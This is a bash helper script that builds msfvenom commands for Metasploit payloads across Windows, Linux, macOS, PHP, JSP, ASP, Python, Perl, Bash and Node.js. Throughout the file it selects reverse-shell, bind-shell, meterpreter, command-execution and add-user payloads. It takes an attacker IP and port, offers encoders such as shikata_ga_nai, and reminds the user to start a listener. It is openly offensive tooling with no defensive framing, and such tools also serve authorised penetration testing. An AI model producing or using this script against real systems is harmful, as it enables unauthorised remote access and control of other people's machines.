#!/bin/bash
# MSFVenom Payload Generator Helper Script
# Usage: ./generate_payload.sh <platform> <type> [options]

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Default values
LHOST=""
LPORT="4444"
RHOST=""
OUTPUT="payload"
FORMAT=""
PAYLOAD=""
ENCODER=""
ENCODE_ITERATIONS=""

# Function to display usage
usage() {
    echo -e "${YELLOW}MSFVenom Payload Generator${NC}"
    echo "Usage: $0 <platform> <type> [options]"
    echo ""
    echo "Platforms: windows, linux, macos, php, jsp, asp, python, perl, bash, nodejs"
    echo "Types: reverse, bind, meterpreter, cmd, exec, adduser"
    echo ""
    echo "Options:"
    echo "  --lhost IP      Attacker IP address (required for reverse shells)"
    echo "  --lport PORT    Attacker port (default: 4444)"
    echo "  --rhost IP      Target IP (required for bind shells)"
    echo "  --output FILE   Output filename (default: payload)"
    echo "  --encoder ENC   Encoder to use (e.g., shikata_ga_nai)"
    echo "  --iterations N  Number of encoding iterations"
    echo "  --format FMT    Output format (auto-detected if not specified)"
    echo "  --help          Show this help message"
    echo ""
    echo "Examples:"
    echo "  $0 windows reverse --lhost 192.168.1.100 --lport 4444"
    echo "  $0 linux meterpreter --lhost 10.0.0.5 --output shell.elf"
    echo "  $0 php reverse --lhost 192.168.1.50 --lport 8080"
    echo "  $0 windows bind --rhost 192.168.1.200 --lport 4444"
    exit 1
}

# Function to generate Windows payload
generate_windows() {
    local type=$1
    case $type in
        reverse|meterpreter)
            PAYLOAD="windows/meterpreter/reverse_tcp"
            FORMAT="exe"
            if [ -z "$LHOST" ]; then
                echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
                exit 1
            fi
            ;;
        bind)
            PAYLOAD="windows/meterpreter/bind_tcp"
            FORMAT="exe"
            if [ -z "$RHOST" ]; then
                echo -e "${RED}Error: RHOST is required for bind shells${NC}"
                exit 1
            fi
            ;;
        cmd)
            PAYLOAD="windows/shell/reverse_tcp"
            FORMAT="exe"
            if [ -z "$LHOST" ]; then
                echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
                exit 1
            fi
            ;;
        exec)
            PAYLOAD="windows/exec"
            FORMAT="exe"
            echo -e "${YELLOW}Note: Add CMD=\"<command>\" to the generated command${NC}"
            ;;
        adduser)
            PAYLOAD="windows/adduser"
            FORMAT="exe"
            echo -e "${YELLOW}Note: Add USER=<username> PASS=<password> to the generated command${NC}"
            ;;
        *)
            echo -e "${RED}Error: Unknown Windows payload type: $type${NC}"
            exit 1
            ;;
    esac
}

# Function to generate Linux payload
generate_linux() {
    local type=$1
    case $type in
        reverse|meterpreter)
            PAYLOAD="linux/x64/meterpreter/reverse_tcp"
            FORMAT="elf"
            if [ -z "$LHOST" ]; then
                echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
                exit 1
            fi
            ;;
        bind)
            PAYLOAD="linux/x64/meterpreter/bind_tcp"
            FORMAT="elf"
            if [ -z "$RHOST" ]; then
                echo -e "${RED}Error: RHOST is required for bind shells${NC}"
                exit 1
            fi
            ;;
        *)
            echo -e "${RED}Error: Unknown Linux payload type: $type${NC}"
            exit 1
            ;;
    esac
}

# Function to generate macOS payload
generate_macos() {
    local type=$1
    case $type in
        reverse)
            PAYLOAD="osx/x86/shell_reverse_tcp"
            FORMAT="macho"
            if [ -z "$LHOST" ]; then
                echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
                exit 1
            fi
            ;;
        bind)
            PAYLOAD="osx/x86/shell_bind_tcp"
            FORMAT="macho"
            if [ -z "$RHOST" ]; then
                echo -e "${RED}Error: RHOST is required for bind shells${NC}"
                exit 1
            fi
            ;;
        *)
            echo -e "${RED}Error: Unknown macOS payload type: $type${NC}"
            exit 1
            ;;
    esac
}

# Function to generate PHP payload
generate_php() {
    PAYLOAD="php/meterpreter_reverse_tcp"
    FORMAT="php"
    if [ -z "$LHOST" ]; then
        echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
        exit 1
    fi
}

# Function to generate JSP payload
generate_jsp() {
    PAYLOAD="java/jsp_shell_reverse_tcp"
    FORMAT="raw"
    if [ -z "$LHOST" ]; then
        echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
        exit 1
    fi
}

# Function to generate ASP payload
generate_asp() {
    PAYLOAD="windows/meterpreter/reverse_tcp"
    FORMAT="asp"
    if [ -z "$LHOST" ]; then
        echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
        exit 1
    fi
}

# Function to generate Python payload
generate_python() {
    PAYLOAD="cmd/unix/reverse_python"
    FORMAT="raw"
    if [ -z "$LHOST" ]; then
        echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
        exit 1
    fi
}

# Function to generate Perl payload
generate_perl() {
    PAYLOAD="cmd/unix/reverse_perl"
    FORMAT="raw"
    if [ -z "$LHOST" ]; then
        echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
        exit 1
    fi
}

# Function to generate Bash payload
generate_bash() {
    PAYLOAD="cmd/unix/reverse_bash"
    FORMAT="raw"
    if [ -z "$LHOST" ]; then
        echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
        exit 1
    fi
}

# Function to generate NodeJS payload
generate_nodejs() {
    PAYLOAD="nodejs/shell_reverse_tcp"
    FORMAT="raw"
    if [ -z "$LHOST" ]; then
        echo -e "${RED}Error: LHOST is required for reverse shells${NC}"
        exit 1
    fi
}

# Parse arguments
if [ $# -lt 2 ]; then
    usage
fi

PLATFORM=$(echo $1 | tr '[:upper:]' '[:lower:]')
TYPE=$(echo $2 | tr '[:upper:]' '[:lower:]')
shift 2

while [[ $# -gt 0 ]]; do
    case $1 in
        --lhost)
            LHOST="$2"
            shift 2
            ;;
        --lport)
            LPORT="$2"
            shift 2
            ;;
        --rhost)
            RHOST="$2"
            shift 2
            ;;
        --output)
            OUTPUT="$2"
            shift 2
            ;;
        --encoder)
            ENCODER="$2"
            shift 2
            ;;
        --iterations)
            ENCODE_ITERATIONS="$2"
            shift 2
            ;;
        --format)
            FORMAT="$2"
            shift 2
            ;;
        --help)
            usage
            ;;
        *)
            echo -e "${RED}Unknown option: $1${NC}"
            usage
            ;;
    esac
done

# Generate payload based on platform
case $PLATFORM in
    windows)
        generate_windows $TYPE
        ;;
    linux)
        generate_linux $TYPE
        ;;
    macos|osx)
        generate_macos $TYPE
        ;;
    php)
        generate_php
        ;;
    jsp)
        generate_jsp
        ;;
    asp)
        generate_asp
        ;;
    python)
        generate_python
        ;;
    perl)
        generate_perl
        ;;
    bash)
        generate_bash
        ;;
    nodejs)
        generate_nodejs
        ;;
    *)
        echo -e "${RED}Error: Unknown platform: $PLATFORM${NC}"
        echo "Valid platforms: windows, linux, macos, php, jsp, asp, python, perl, bash, nodejs"
        exit 1
        ;;
esac

# Build the command
CMD="msfvenom -p $PAYLOAD"

# Add LHOST for reverse shells
if [ -n "$LHOST" ]; then
    CMD="$CMD LHOST=$LHOST"
fi

# Add LPORT
CMD="$CMD LPORT=$LPORT"

# Add RHOST for bind shells
if [ -n "$RHOST" ]; then
    CMD="$CMD RHOST=$RHOST"
fi

# Add encoder if specified
if [ -n "$ENCODER" ]; then
    CMD="$CMD -e $ENCODER"
    if [ -n "$ENCODE_ITERATIONS" ]; then
        CMD="$CMD -i $ENCODE_ITERATIONS"
    fi
fi

# Add format
CMD="$CMD -f $FORMAT"

# Add output
CMD="$CMD > $OUTPUT.$FORMAT"

# Display the command
echo -e "${GREEN}Generated MSFVenom command:${NC}"
echo ""
echo "$CMD"
echo ""
echo -e "${YELLOW}To execute, run the command above or copy it to your clipboard.${NC}"
echo -e "${YELLOW}Remember to start a listener in Metasploit before executing the payload.${NC}"
